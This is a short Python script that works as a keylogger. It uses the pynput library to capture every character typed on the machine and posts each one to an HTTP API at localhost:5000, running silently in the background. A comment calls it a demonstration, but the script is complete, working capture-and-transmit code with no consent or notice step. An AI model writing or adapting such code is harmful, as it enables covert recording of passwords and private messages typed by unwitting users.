from pynput.keyboard import Key, Listener
import time
import requests

def on_press(key):
    try:
        character = key.char
    except AttributeError:
        
        return

    # Send the key press data to the API
    requests.post('http://localhost:5000/key_press', json={'character': character})

    # Small delay to reduce the load on the computer
    time.sleep(0.001)

# Set up the listener
listener = Listener(on_press=on_press)

# Start the listener
listener.start()

# Run the listener in the background
try:
    while True:
        pass
except KeyboardInterrupt:
    # Stop the listener with ctrl +c (made for demonstrating )
    listener.stop()
